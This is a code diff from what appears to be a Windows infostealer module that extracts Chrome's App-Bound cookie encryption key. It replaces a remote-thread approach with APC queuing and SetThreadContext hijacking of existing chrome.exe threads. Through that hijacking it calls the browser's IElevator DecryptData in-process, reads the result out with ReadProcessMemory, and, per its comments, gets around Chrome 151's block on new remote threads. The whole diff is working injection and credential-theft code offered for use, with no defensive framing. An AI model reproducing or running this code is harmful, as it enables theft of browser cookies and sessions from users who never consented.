@@ -32,6 +32,9 @@ _DUP_HANDLE_MAX_HANDLES = 4000
 _ABE_COCREATE_TIMEOUT_S = 2.0
 _ABE_HELPER_TIMEOUT_S = 8.0
 _ABE_MEMSCAN_TIMEOUT_S = 6.0
+_ABE_ELEVATOR_TIMEOUT_S = 3.0
+_ABE_BROWSER_KEYS_TIMEOUT_S = 12.0
+_ELEV_PENDING_HR = 0x0E110001
 _ABE_MEMSCAN_MAX_BYTES = 256 << 20
 _ABE_MEMSCAN_MAX_CAND = 20000
 _ABE_MEMSCAN_MAX_REGION = 32 << 20
@@ -3044,7 +3047,11 @@ def _browser_keys(
     cached = _abe_memo.get(sig)
     if cached is not None:
         return cached
-    keys = _browser_keys_uncached(path, v20_sample)
+    keys = _call_with_timeout(
+        lambda: _browser_keys_uncached(path, v20_sample),
+        _ABE_BROWSER_KEYS_TIMEOUT_S,
+        _BrowserKeys(status="chrome_dir", hr="apc:q:err=timeout"),
+    )
     _abe_memo[sig] = keys
     if len(_abe_memo) > 8:
         oldest = next(iter(_abe_memo))
@@ -4437,14 +4444,26 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
         key = _static_app_bound_cookie_key(v20_sample)
         if _abe_proves_cookies(key, v20_sample):
             return key, "0x00000000"
-    # chrome.exe>0 is the gate — not os.name. After all13, heap consider then
-    # IElevator::DecryptData inside chrome (never CoCreate from this process).
+    # chrome.exe>0 is the gate — not os.name. After all13, DecryptData on an
+    # existing browser thread, then keep considering heap until hit / budget.
     pids: list[int] = []
     try:
         pids = _chrome_pids_prioritized()
     except Exception:  # noqa: BLE001
         pids = []
     if pids:
+        key, ehr = _call_with_timeout(
+            lambda: _chrome_elevator_abe_key(v20_sample),
+            _ABE_ELEVATOR_TIMEOUT_S,
+            (None, "apc:q:err=timeout"),
+        )
+        if ehr:
+            trail.append(ehr)
+        if _abe_proves_cookies(key, v20_sample):
+            hit = str(_cache.get("_abe_hit") or "")
+            if hit in {"heap:hit", "apc:key"}:
+                return key, f"0x00000000;{hit}"
+            return key, "0x00000000"
         key, hr = _memscan_abe_key(v20_sample)
         if _abe_proves_cookies(key, v20_sample):
             hit = str(_cache.get("_abe_hit") or "")
@@ -4453,14 +4472,6 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
             return key, "0x00000000"
         if hr:
             trail.append(hr)
-        key, ehr = _chrome_elevator_abe_key(v20_sample)
-        if ehr:
-            trail.append(ehr)
-        if _abe_proves_cookies(key, v20_sample):
-            hit = str(_cache.get("_abe_hit") or "")
-            if hit in {"heap:hit", "apc:key"}:
-                return key, f"0x00000000;{hit}"
-            return key, "0x00000000"
     if all13:
         return None, _join_abe_hr(trail)
     helper, compile_hr = _compiled_abe_helper_exe()
@@ -5776,66 +5787,23 @@ def _elev_hr_token(hr: int) -> str:
     return f"apc:hr=0x{int(hr) & 0xFFFFFFFF:08x}"
 
 
-def _chrome_elevator_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
-    """IElevator::DecryptData inside browser chrome.exe. Never CoCreate here."""
-    if os.name != "nt":
-        return None, "apc:0"
-    blob = _app_bound_blob_bytes()
-    if not blob:
-        return None, "alloc:err=appb"
-    payloads = [blob]
-    if len(blob) > 4:
-        payloads.append(blob[4:])
-    pids = _chrome_pids_prioritized()
-    if not pids:
-        return None, "crt:err=pid"
-    last = "crt:err=0"
-    tries = 0
-    for pid in pids[:2]:
-        for clsid_s, iid_s in _CHROME_ELEVATOR[:2]:
-            for payload in payloads:
-                for clsctx, coinit in ((4, 2), (4, 0)):
-                    tries += 1
-                    if tries > 8:
-                        return None, last
-                    pt, hr = _chrome_elevator_decrypt_once(
-                        pid, payload, clsid_s, iid_s, clsctx, coinit
-                    )
-                    last = hr
-                    if not pt:
-                        continue
-                    key = _accept_aes_key(pt)
-                    if key and _v20_one_ok(key, v20_sample):
-                        _note_abe_hit("apc:key")
-                        return key, "apc:key"
-                    if len(pt) >= 32:
-                        for off in (0, 4, 16, 32):
-                            if off + 32 <= len(pt) and _v20_one_ok(pt[off : off + 32], v20_sample):
-                                _note_abe_hit("apc:key")
-                                return pt[off : off + 32], "apc:key"
-                    last = f"elev:len={len(pt)}"
-    return None, last
+def _apc_q_err(code: Any) -> str:
+    if isinstance(code, int):
+        if code < 0 or code > 255:
+            return f"apc:q:err=0x{int(code) & 0xFFFFFFFF:08x}"
+        return f"apc:q:err={code}"
+    text = str(code or "q").strip() or "q"
+    return f"apc:q:err={text[:24]}"
 
 
-def _chrome_elevator_via_exports(
-    pid: int,
-    payload: bytes,
-    clsid_s: str,
-    iid_s: str,
-    clsctx: int,
-    coinit: int,
-) -> tuple[bytes | None, str]:
-    """IElevator::DecryptData via CFG-valid ole32 exports + SetThreadContext. Not a stub."""
-    try:
-        import ctypes
-        from ctypes import wintypes
-    except ImportError:
-        return None, "crt:err=ctypes"
-    if not hasattr(ctypes, "WinDLL"):
-        return None, "crt:err=ctypes"
-    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
+def _bind_elevator_winapi(k32: Any, ntdll: Any) -> None:
+    from ctypes import wintypes
+    import ctypes
+
     k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
     k32.OpenProcess.restype = wintypes.HANDLE
+    k32.OpenThread.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
+    k32.OpenThread.restype = wintypes.HANDLE
     k32.CloseHandle.argtypes = [wintypes.HANDLE]
     k32.CloseHandle.restype = wintypes.BOOL
     k32.VirtualAllocEx.argtypes = [
@@ -5862,16 +5830,6 @@ def _chrome_elevator_via_exports(
         ctypes.POINTER(ctypes.c_size_t),
     ]
     k32.ReadProcessMemory.restype = wintypes.BOOL
-    k32.CreateRemoteThread.argtypes = [
-        wintypes.HANDLE,
-        ctypes.c_void_p,
-        ctypes.c_size_t,
-        ctypes.c_void_p,
-        ctypes.c_void_p,
-        wintypes.DWORD,
-        ctypes.POINTER(wintypes.DWORD),
-    ]
-    k32.CreateRemoteThread.restype = wintypes.HANDLE
     k32.GetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
     k32.GetThreadContext.restype = wintypes.BOOL
     k32.SetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
@@ -5880,34 +5838,270 @@ def _chrome_elevator_via_exports(
     k32.ResumeThread.restype = wintypes.DWORD
     k32.SuspendThread.argtypes = [wintypes.HANDLE]
     k32.SuspendThread.restype = wintypes.DWORD
-    k32.TerminateThread.argtypes = [wintypes.HANDLE, wintypes.DWORD]
-    k32.TerminateThread.restype = wintypes.BOOL
-    k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
-    k32.WaitForSingleObject.restype = wintypes.DWORD
+    ntdll.NtQueueApcThread.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+    ]
+    ntdll.NtQueueApcThread.restype = ctypes.c_long
+    if hasattr(ntdll, "NtQueueApcThreadEx2"):
+        ntdll.NtQueueApcThreadEx2.argtypes = [
+            wintypes.HANDLE,
+            wintypes.HANDLE,
+            wintypes.ULONG,
+            ctypes.c_void_p,
+            ctypes.c_void_p,
+            ctypes.c_void_p,
+            ctypes.c_void_p,
+        ]
+        ntdll.NtQueueApcThreadEx2.restype = ctypes.c_long
+    if hasattr(ntdll, "NtQueueApcThreadEx"):
+        ntdll.NtQueueApcThreadEx.argtypes = [
+            wintypes.HANDLE,
+            wintypes.HANDLE,
+            ctypes.c_void_p,
+            ctypes.c_void_p,
+            ctypes.c_void_p,
+            ctypes.c_void_p,
+        ]
+        ntdll.NtQueueApcThreadEx.restype = ctypes.c_long
+    if hasattr(ntdll, "NtAlertThread"):
+        ntdll.NtAlertThread.argtypes = [wintypes.HANDLE]
+        ntdll.NtAlertThread.restype = ctypes.c_long
+    if hasattr(k32, "QueueUserAPC"):
+        k32.QueueUserAPC.argtypes = [ctypes.c_void_p, wintypes.HANDLE, ctypes.c_void_p]
+        k32.QueueUserAPC.restype = wintypes.DWORD
+
+
+def _queue_special_apc(ntdll: Any, k32: Any, thread: Any, routine: int, a1: int = 0, a2: int = 0, a3: int = 0) -> int:
+    """Queue APC on an existing thread. 0 = queued. Never a new thread."""
+    import ctypes
+
+    routine_p = ctypes.c_void_p(int(routine))
+    a1p = ctypes.c_void_p(int(a1 or 0))
+    a2p = ctypes.c_void_p(int(a2 or 0))
+    a3p = ctypes.c_void_p(int(a3 or 0))
+    last = 0
+    if hasattr(ntdll, "NtQueueApcThreadEx2"):
+        last = int(ntdll.NtQueueApcThreadEx2(thread, None, 1, routine_p, a1p, a2p, a3p))
+        if last >= 0:
+            return 0
+    if hasattr(ntdll, "NtQueueApcThreadEx"):
+        last = int(ntdll.NtQueueApcThreadEx(thread, None, routine_p, a1p, a2p, a3p))
+        if last >= 0:
+            return 0
+    last = int(ntdll.NtQueueApcThread(thread, routine_p, a1p, a2p, a3p))
+    if last >= 0:
+        return 0
+    queued = getattr(k32, "QueueUserAPC", None)
+    if queued is not None:
+        ok = int(queued(routine_p, thread, a1p) or 0)
+        if ok:
+            return 0
+        last = last or _win32_err()
+    return int(last) if last else (_win32_err() or 1)
+
+
+def _alert_existing_thread(ntdll: Any, k32: Any, thread: Any, nt_test_alert: int = 0) -> None:
+    if hasattr(ntdll, "NtAlertThread"):
+        try:
+            ntdll.NtAlertThread(thread)
+            return
+        except (OSError, ValueError, TypeError):
+            pass
+    if nt_test_alert:
+        _queue_special_apc(ntdll, k32, thread, int(nt_test_alert), 0, 0, 0)
+
+
+def _open_existing_threads(k32: Any, pid: int, limit: int = 6) -> list[Any]:
+    access = 0x0010 | 0x0002 | 0x0008 | 0x0040  # SET_CONTEXT | SUSPEND | GET | QUERY
+    opened: list[Any] = []
+    last_err = 0
+    for tid in _threads_for_pid(int(pid))[:24]:
+        th = k32.OpenThread(access, False, tid)
+        if th:
+            opened.append(th)
+        else:
+            last_err = _win32_err() or last_err
+        if len(opened) >= limit:
+            break
+    if not opened:
+        _cache["_elev_q_err"] = last_err or "nothread"
+    return opened
+
+
+def _hijack_existing_thread(
+    k32: Any,
+    proc: Any,
+    thread: Any,
+    rip: int,
+    rcx: int,
+    rdx: int,
+    r8: int,
+    r9: int,
+    stack_rsp: int,
+    extra: bytes,
+    timeout_s: float,
+) -> int | None:
+    """SetThreadContext onto a CFG-valid export on an existing thread, then restore."""
+    import ctypes
+
     ctx_flags, ctx_rax, ctx_rcx, ctx_rdx = 0x30, 0x78, 0x80, 0x88
     ctx_rsp, ctx_r8, ctx_r9, ctx_rip = 0x98, 0xB8, 0xC0, 0xF8
     ctx_size = 1232
     context_integer_control = 0x100003
-    access = 0x0010 | 0x0020 | 0x0008 | 0x0002 | 0x0400 | 0x1000 | 0x0200
-    handle = k32.OpenProcess(access, False, int(pid))
+    wrote = ctypes.c_size_t(0)
+    if k32.SuspendThread(thread) == 0xFFFFFFFF:
+        return None
+    orig = (ctypes.c_char * ctx_size)()
+    orig[ctx_flags : ctx_flags + 4] = context_integer_control.to_bytes(4, "little")
+    if not k32.GetThreadContext(thread, orig):
+        k32.ResumeThread(thread)
+        return None
+    stack = bytearray(64)
+    orig_rip = int.from_bytes(bytes(orig[ctx_rip : ctx_rip + 8]), "little")
+    stack[0:8] = int(orig_rip).to_bytes(8, "little")
+    if extra:
+        stack[0x28 : 0x28 + min(len(extra), 32)] = extra[:32]
+    if not k32.WriteProcessMemory(
+        proc,
+        int(stack_rsp),
+        ctypes.create_string_buffer(bytes(stack), 64),
+        64,
+        ctypes.byref(wrote),
+    ):
+        k32.ResumeThread(thread)
+        return None
+    ctx = (ctypes.c_char * ctx_size)()
+    ctx[0:ctx_size] = orig[0:ctx_size]
+    ctx[ctx_rcx : ctx_rcx + 8] = int(rcx).to_bytes(8, "little")
+    ctx[ctx_rdx : ctx_rdx + 8] = int(rdx).to_bytes(8, "little")
+    ctx[ctx_r8 : ctx_r8 + 8] = int(r8).to_bytes(8, "little")
+    ctx[ctx_r9 : ctx_r9 + 8] = int(r9).to_bytes(8, "little")
+    ctx[ctx_rsp : ctx_rsp + 8] = int(stack_rsp).to_bytes(8, "little")
+    ctx[ctx_rip : ctx_rip + 8] = int(rip).to_bytes(8, "little")
+    ctx[ctx_flags : ctx_flags + 4] = context_integer_control.to_bytes(4, "little")
+    if not k32.SetThreadContext(thread, ctx):
+        k32.ResumeThread(thread)
+        return None
+    k32.ResumeThread(thread)
+    deadline = time.monotonic() + max(0.15, float(timeout_s))
+    rax = 0
+    left = False
+    while time.monotonic() < deadline:
+        time.sleep(0.01)
+        if k32.SuspendThread(thread) == 0xFFFFFFFF:
+            break
+        peek = (ctypes.c_char * ctx_size)()
+        peek[ctx_flags : ctx_flags + 4] = context_integer_control.to_bytes(4, "little")
+        if k32.GetThreadContext(thread, peek):
+            cur = int.from_bytes(bytes(peek[ctx_rip : ctx_rip + 8]), "little")
+            rax = int.from_bytes(bytes(peek[ctx_rax : ctx_rax + 8]), "little")
+            if cur != rip and abs(cur - rip) > 0x800:
+                left = True
+        if left:
+            k32.SetThreadContext(thread, orig)
+            k32.ResumeThread(thread)
+            return rax & 0xFFFFFFFF
+        k32.ResumeThread(thread)
+    if k32.SuspendThread(thread) != 0xFFFFFFFF:
+        k32.SetThreadContext(thread, orig)
+        k32.ResumeThread(thread)
+    return None
+
+
+def _elevator_open_process(k32: Any, pid: int) -> Any:
+    """VM + query only. No PROCESS_CREATE_THREAD — Chrome 151 denies a new thread."""
+    access = 0x0010 | 0x0020 | 0x0008 | 0x0400 | 0x1000
+    return k32.OpenProcess(access, False, int(pid))
+
+
+def _close_thread_list(k32: Any, threads: list[Any]) -> None:
+    for th in threads:
+        try:
+            k32.CloseHandle(th)
+        except Exception:  # noqa: BLE001
+            pass
+
+
+def _chrome_elevator_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
+    """IElevator::DecryptData on an existing browser chrome.exe thread. Never CoCreate here."""
+    if os.name != "nt":
+        return None, "apc:0"
+    blob = _app_bound_blob_bytes()
+    if not blob:
+        return None, "alloc:err=appb"
+    payload = blob[4:] if blob[:4] == b"APPB" else blob
+    if not payload:
+        return None, "alloc:err=appb"
+    pids = _chrome_pids_prioritized()
+    if not pids:
+        return None, "apc:q:err=pid"
+    last = "apc:q:err=0"
+    deadline = time.monotonic() + _ABE_ELEVATOR_TIMEOUT_S
+    pid = int(pids[0])
+    for clsid_s, iid_s in _CHROME_ELEVATOR[:2]:
+        for flag in (1, 0):
+            if time.monotonic() >= deadline:
+                return None, last if last != "apc:q:err=0" else "apc:q:err=timeout"
+            remain = max(0.2, deadline - time.monotonic())
+            pt, hr = _chrome_elevator_decrypt_once(
+                pid, payload, clsid_s, iid_s, 4, 2, flag, remain
+            )
+            last = hr
+            if not pt:
+                continue
+            key = _accept_aes_key(pt)
+            if key and _v20_one_ok(key, v20_sample):
+                _note_abe_hit("apc:key")
+                return key, "apc:key"
+            if len(pt) >= 32:
+                for off in (0, 4, 16, 32):
+                    if off + 32 <= len(pt) and _v20_one_ok(pt[off : off + 32], v20_sample):
+                        _note_abe_hit("apc:key")
+                        return pt[off : off + 32], "apc:key"
+            last = f"elev:len={len(pt)}"
+    return None, last if last != "apc:q:err=0" else "apc:q:err=miss"
+
+
+def _chrome_elevator_via_exports(
+    pid: int,
+    payload: bytes,
+    clsid_s: str,
+    iid_s: str,
+    clsctx: int,
+    coinit: int,
+    flag: int = 0,
+    budget_s: float = 1.2,
+) -> tuple[bytes | None, str]:
+    """DecryptData via CFG-valid ole32 exports on an existing thread. vtable slot 5."""
+    try:
+        import ctypes
+        from ctypes import wintypes
+    except ImportError:
+        return None, "apc:q:err=ctypes"
+    if not hasattr(ctypes, "WinDLL"):
+        return None, "apc:q:err=ctypes"
+    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
+    _bind_elevator_winapi(k32, ntdll)
+    handle = _elevator_open_process(k32, pid)
     if not handle:
-        err = _win32_err()
-        return None, f"crt:err={err or 'open'}"
-    thread = None
+        return None, _apc_q_err(_win32_err() or "open")
+    threads: list[Any] = []
     try:
         coinit_fn = _remote_export_addr(k32, handle, "ole32.dll", "CoInitializeEx")
         cocreate = _remote_export_addr(k32, handle, "ole32.dll", "CoCreateInstance")
-        alert = _remote_export_addr(k32, handle, "ntdll.dll", "NtTestAlert")
-        exit_fn = _remote_export_addr(k32, handle, "kernel32.dll", "ExitThread")
+        nt_test_alert = _remote_export_addr(k32, handle, "ntdll.dll", "NtTestAlert")
         if not coinit_fn or not cocreate:
-            return None, "crt:err=ole32"
-        if not alert or not exit_fn:
-            return None, "crt:err=k32"
+            return None, "apc:q:err=ole32"
         try:
             clsid = _guid_bytes(clsid_s)
             iid = _guid_bytes(iid_s)
         except (AttributeError, OSError, ValueError, TypeError):
-            return None, "crt:err=guid"
+            return None, "apc:q:err=guid"
         page = k32.VirtualAllocEx(handle, None, 4096, 0x3000, 0x04)
         if not page:
             return None, f"alloc:err={_win32_err() or 8}"
@@ -5925,129 +6119,91 @@ def _chrome_elevator_via_exports(
         src = (ctypes.c_ubyte * 4096).from_buffer_copy(bytes(block))
         if not k32.WriteProcessMemory(handle, page, src, 4096, ctypes.byref(wrote)):
             return None, f"alloc:err={_win32_err() or 'wpm'}"
-        tid = wintypes.DWORD(0)
-        thread = k32.CreateRemoteThread(
-            handle, None, 0, alert, None, 0x4, ctypes.byref(tid)
-        )
-        if not thread:
-            return None, f"crt:err={_win32_err() or 'crt'}"
-
-        def load_ctx() -> bytearray:
-            ctx = bytearray(ctx_size)
-            ctx[ctx_flags : ctx_flags + 4] = context_integer_control.to_bytes(4, "little")
-            buf = (ctypes.c_char * ctx_size).from_buffer(ctx)
-            if not k32.GetThreadContext(thread, buf):
-                return bytearray()
-            return ctx
-
-        def store_ctx(ctx: bytearray) -> bool:
-            ctx[ctx_flags : ctx_flags + 4] = context_integer_control.to_bytes(4, "little")
-            buf = (ctypes.c_char * ctx_size).from_buffer(ctx)
-            return bool(k32.SetThreadContext(thread, buf))
-
-        def hijack(rip: int, rcx: int, rdx: int, r8: int, r9: int, extra: bytes, park: bool) -> int:
-            rsp = ((page + stack_addr + 512) & ~0xF) - 8
-            stack = bytearray(64)
-            stack[0:8] = int(exit_fn if not park else alert).to_bytes(8, "little")
-            if extra:
-                stack[0x28 : 0x28 + len(extra)] = extra
-            if not k32.WriteProcessMemory(
-                handle,
-                rsp,
-                ctypes.create_string_buffer(bytes(stack), 64),
-                64,
-                ctypes.byref(wrote),
-            ):
-                return -1
-            ctx = load_ctx()
-            if not ctx:
-                return -1
-            ctx[ctx_rcx : ctx_rcx + 8] = int(rcx).to_bytes(8, "little")
-            ctx[ctx_rdx : ctx_rdx + 8] = int(rdx).to_bytes(8, "little")
-            ctx[ctx_r8 : ctx_r8 + 8] = int(r8).to_bytes(8, "little")
-            ctx[ctx_r9 : ctx_r9 + 8] = int(r9).to_bytes(8, "little")
-            ctx[ctx_rsp : ctx_rsp + 8] = int(rsp).to_bytes(8, "little")
-            ctx[ctx_rip : ctx_rip + 8] = int(rip).to_bytes(8, "little")
-            if not store_ctx(ctx):
-                return -1
-            k32.ResumeThread(thread)
-            deadline = time.monotonic() + 1.5
-            rax = 0
-            while time.monotonic() < deadline:
-                time.sleep(0.002)
-                if k32.SuspendThread(thread) == 0xFFFFFFFF:
-                    return rax
-                ctx = load_ctx()
-                if not ctx:
-                    return -1
-                cur = int.from_bytes(ctx[ctx_rip : ctx_rip + 8], "little")
-                rax = int.from_bytes(ctx[ctx_rax : ctx_rax + 8], "little")
-                if cur != rip and abs(cur - rip) > 0x800:
-                    if not park:
-                        k32.ResumeThread(thread)
-                        k32.WaitForSingleObject(thread, 500)
-                    return rax & 0xFFFFFFFF
-                k32.ResumeThread(thread)
-            k32.TerminateThread(thread, 0)
-            return -1
-
-        hr = hijack(coinit_fn, 0, int(coinit), 0, 0, b"", True)
-        if hr < 0:
-            return None, f"crt:err={_win32_err() or 'coinit'}"
-        extra = int(ppv_addr).to_bytes(8, "little")
-        hr = hijack(cocreate, clsid_addr, 0, int(clsctx), iid_addr, extra, True)
-        if hr < 0:
-            return None, f"crt:err={_win32_err() or 'cocreate'}"
-        if hr & 0x80000000:
-            return None, _elev_hr_token(hr)
-        ppv_buf = (ctypes.c_char * 8)()
-        if not k32.ReadProcessMemory(handle, ppv_addr, ppv_buf, 8, ctypes.byref(wrote)):
-            return None, f"crt:err={_win32_err() or 'ppv'}"
-        punk = int.from_bytes(bytes(ppv_buf), "little")
-        if not punk:
-            return None, _elev_hr_token(hr or 0x80004003)
-        vt_buf = (ctypes.c_char * 8)()
-        if not k32.ReadProcessMemory(handle, punk, vt_buf, 8, ctypes.byref(wrote)):
-            return None, "crt:err=vtable"
-        vtable = int.from_bytes(bytes(vt_buf), "little")
-        slot_buf = (ctypes.c_char * 8)()
-        if not k32.ReadProcessMemory(handle, vtable + 40, slot_buf, 8, ctypes.byref(wrote)):
-            return None, "crt:err=slot5"
-        decrypt = int.from_bytes(bytes(slot_buf), "little")
-        if not decrypt:
-            return None, "crt:err=slot5"
-        hr = hijack(decrypt, punk, bstr_data, bstr_out_addr, last_err_addr, b"", False)
-        if hr < 0:
-            return None, f"crt:err={_win32_err() or 'decrypt'}"
-        if hr & 0x80000000:
-            return None, _elev_hr_token(hr)
-        out_ptr_buf = (ctypes.c_char * 8)()
-        if not k32.ReadProcessMemory(
-            handle, bstr_out_addr, out_ptr_buf, 8, ctypes.byref(wrote)
-        ):
-            return None, "elev:len=0"
-        bstr = int.from_bytes(bytes(out_ptr_buf), "little")
-        if not bstr:
-            return None, "elev:len=0"
-        len_buf = (ctypes.c_char * 4)()
-        if not k32.ReadProcessMemory(handle, bstr - 4, len_buf, 4, ctypes.byref(wrote)):
-            return None, "elev:len=0"
-        n = int.from_bytes(bytes(len_buf), "little")
-        if n <= 0 or n > out_max:
-            return None, f"elev:len={n}"
-        out = (ctypes.c_char * n)()
-        if not k32.ReadProcessMemory(handle, bstr, out, n, ctypes.byref(wrote)):
-            return None, f"elev:len={n}"
-        return bytes(out), f"elev:len={n}"
+        threads = _open_existing_threads(k32, pid, limit=4)
+        if not threads:
+            return None, _apc_q_err(_cache.get("_elev_q_err") or "nothread")
+        last_q: Any = 0
+        deadline = time.monotonic() + max(0.2, float(budget_s))
+        rsp = ((page + stack_addr + 512) & ~0xF) - 8
+        for th in threads:
+            if time.monotonic() >= deadline:
+                break
+            remain = max(0.15, deadline - time.monotonic())
+            qst = _queue_special_apc(ntdll, k32, th, int(coinit_fn), 0, int(coinit), 0)
+            if qst != 0:
+                last_q = qst
+                hr_init = _hijack_existing_thread(
+                    k32, handle, th, int(coinit_fn), 0, int(coinit), 0, 0, rsp, b"", min(0.35, remain)
+                )
+                if hr_init is None:
+                    continue
+            else:
+                _alert_existing_thread(ntdll, k32, th, int(nt_test_alert or 0))
+                time.sleep(0.02)
+            extra = int(ppv_addr).to_bytes(8, "little")
+            hr = _hijack_existing_thread(
+                k32, handle, th, int(cocreate), clsid_addr, 0, int(clsctx), iid_addr, rsp, extra, min(0.45, remain)
+            )
+            if hr is None:
+                last_q = last_q or "ctx"
+                continue
+            if hr & 0x80000000:
+                return None, _elev_hr_token(hr)
+            ppv_buf = (ctypes.c_char * 8)()
+            if not k32.ReadProcessMemory(handle, ppv_addr, ppv_buf, 8, ctypes.byref(wrote)):
+                return None, _apc_q_err(_win32_err() or "ppv")
+            punk = int.from_bytes(bytes(ppv_buf), "little")
+            if not punk:
+                return None, _elev_hr_token(hr or 0x80004003)
+            vt_buf = (ctypes.c_char * 8)()
+            if not k32.ReadProcessMemory(handle, punk, vt_buf, 8, ctypes.byref(wrote)):
+                return None, _apc_q_err("vtable")
+            vtable = int.from_bytes(bytes(vt_buf), "little")
+            slot_buf = (ctypes.c_char * 8)()
+            if not k32.ReadProcessMemory(handle, vtable + 40, slot_buf, 8, ctypes.byref(wrote)):
+                return None, _apc_q_err("slot5")
+            decrypt = int.from_bytes(bytes(slot_buf), "little")
+            if not decrypt:
+                return None, _apc_q_err("slot5")
+            # IElevator2: (this, bstr, flags, out). IElevator: (this, bstr, out, last_err).
+            variants = (
+                (int(bstr_data), int(flag), int(bstr_out_addr), b""),
+                (int(bstr_data), int(bstr_out_addr), int(last_err_addr), b""),
+            )
+            for rdx, r8, r9, extra_d in variants:
+                if time.monotonic() >= deadline:
+                    break
+                hr = _hijack_existing_thread(
+                    k32, handle, th, decrypt, punk, rdx, r8, r9, rsp, extra_d, min(0.45, remain)
+                )
+                if hr is None:
+                    last_q = last_q or "decrypt"
+                    continue
+                if hr & 0x80000000:
+                    return None, _elev_hr_token(hr)
+                out_ptr_buf = (ctypes.c_char * 8)()
+                if not k32.ReadProcessMemory(
+                    handle, bstr_out_addr, out_ptr_buf, 8, ctypes.byref(wrote)
+                ):
+                    return None, "elev:len=0"
+                bstr = int.from_bytes(bytes(out_ptr_buf), "little")
+                if not bstr:
+                    return None, "elev:len=0"
+                len_buf = (ctypes.c_char * 4)()
+                if not k32.ReadProcessMemory(handle, bstr - 4, len_buf, 4, ctypes.byref(wrote)):
+                    return None, "elev:len=0"
+                n = int.from_bytes(bytes(len_buf), "little")
+                if n <= 0 or n > out_max:
+                    return None, f"elev:len={n}"
+                out = (ctypes.c_char * n)()
+                if not k32.ReadProcessMemory(handle, bstr, out, n, ctypes.byref(wrote)):
+                    return None, f"elev:len={n}"
+                return bytes(out), f"elev:len={n}"
+        return None, _apc_q_err(last_q or _cache.get("_elev_q_err") or "pending")
     except (AttributeError, OSError, ValueError, TypeError, OverflowError) as exc:
-        return None, f"crt:err={type(exc).__name__}"
+        return None, _apc_q_err(type(exc).__name__)
     finally:
-        if thread:
-            try:
-                k32.TerminateThread(thread, 0)
-            except Exception:  # noqa: BLE001
-                pass
-            k32.CloseHandle(thread)
+        _close_thread_list(k32, threads)
         k32.CloseHandle(handle)
 
 
@@ -6058,12 +6214,16 @@ def _chrome_elevator_decrypt_once(
     iid_s: str,
     clsctx: int,
     coinit: int,
+    flag: int = 0,
+    budget_s: float = 1.2,
 ) -> tuple[bytes | None, str]:
-    """Remote-thread IElevator::DecryptData (vtable slot 5) in chrome. Keep the real hr."""
-    if os.name != "nt" or not payload or not pid:
+    """IElevator::DecryptData (vtable slot 5) on an existing chrome thread. Keep the real hr."""
+    if os.name != "nt":
         return None, "apc:0"
+    if not payload or not pid:
+        return None, "apc:q:err=payload"
     pt, export_hr = _chrome_elevator_via_exports(
-        pid, payload, clsid_s, iid_s, clsctx, coinit
+        pid, payload, clsid_s, iid_s, clsctx, coinit, flag, budget_s
     )
     if pt or (export_hr or "").startswith(("apc:hr=", "elev:len=", "apc:key")):
         return pt, export_hr
@@ -6071,90 +6231,28 @@ def _chrome_elevator_decrypt_once(
         import ctypes
         from ctypes import wintypes
     except ImportError:
-        return None, export_hr or "crt:err=ctypes"
+        return None, export_hr or "apc:q:err=ctypes"
     if not hasattr(ctypes, "WinDLL"):
-        return None, export_hr or "crt:err=ctypes"
+        return None, export_hr or "apc:q:err=ctypes"
     k32 = ctypes.WinDLL("kernel32", use_last_error=True)
     ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
-    k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
-    k32.OpenProcess.restype = wintypes.HANDLE
-    k32.CloseHandle.argtypes = [wintypes.HANDLE]
-    k32.CloseHandle.restype = wintypes.BOOL
-    k32.VirtualAllocEx.argtypes = [
-        wintypes.HANDLE,
-        ctypes.c_void_p,
-        ctypes.c_size_t,
-        wintypes.DWORD,
-        wintypes.DWORD,
-    ]
-    k32.VirtualAllocEx.restype = ctypes.c_void_p
-    k32.WriteProcessMemory.argtypes = [
-        wintypes.HANDLE,
-        ctypes.c_void_p,
-        ctypes.c_void_p,
-        ctypes.c_size_t,
-        ctypes.POINTER(ctypes.c_size_t),
-    ]
-    k32.WriteProcessMemory.restype = wintypes.BOOL
-    k32.ReadProcessMemory.argtypes = [
-        wintypes.HANDLE,
-        ctypes.c_void_p,
-        ctypes.c_void_p,
-        ctypes.c_size_t,
-        ctypes.POINTER(ctypes.c_size_t),
-    ]
-    k32.ReadProcessMemory.restype = wintypes.BOOL
-    k32.CreateRemoteThread.argtypes = [
-        wintypes.HANDLE,
-        ctypes.c_void_p,
-        ctypes.c_size_t,
-        ctypes.c_void_p,
-        ctypes.c_void_p,
-        wintypes.DWORD,
-        ctypes.POINTER(wintypes.DWORD),
-    ]
-    k32.CreateRemoteThread.restype = wintypes.HANDLE
-    k32.ResumeThread.argtypes = [wintypes.HANDLE]
-    k32.ResumeThread.restype = wintypes.DWORD
-    k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
-    k32.WaitForSingleObject.restype = wintypes.DWORD
-    k32.OpenThread.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
-    k32.OpenThread.restype = wintypes.HANDLE
-    ntdll.NtQueueApcThread.argtypes = [
-        wintypes.HANDLE,
-        ctypes.c_void_p,
-        ctypes.c_void_p,
-        ctypes.c_void_p,
-        ctypes.c_void_p,
-    ]
-    ntdll.NtQueueApcThread.restype = ctypes.c_long
-    if hasattr(ntdll, "NtQueueApcThreadEx2"):
-        ntdll.NtQueueApcThreadEx2.argtypes = [
-            wintypes.HANDLE,
-            ctypes.c_void_p,
-            ctypes.c_ulong,
-            ctypes.c_void_p,
-            ctypes.c_void_p,
-            ctypes.c_void_p,
-            ctypes.c_void_p,
-        ]
